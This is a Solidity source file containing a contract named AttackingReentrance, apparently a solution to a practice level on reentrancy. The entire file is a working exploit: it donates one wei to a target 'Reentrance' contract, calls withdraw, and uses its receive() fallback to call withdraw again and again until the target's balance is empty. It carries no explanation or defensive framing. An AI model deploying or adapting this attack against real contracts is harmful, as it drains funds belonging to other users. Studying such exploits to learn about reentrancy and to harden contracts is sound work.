// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";

contract AttackingReentrance {
    address payable public contractAddress;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        Reentrance victim = Reentrance(contractAddress);
        victim.donate{value: 1}(address(this));
        victim.withdraw();
    }

    receive() external payable{
        if(contractAddress.balance > 0){
            Reentrance(contractAddress).withdraw();
        }
    }
}
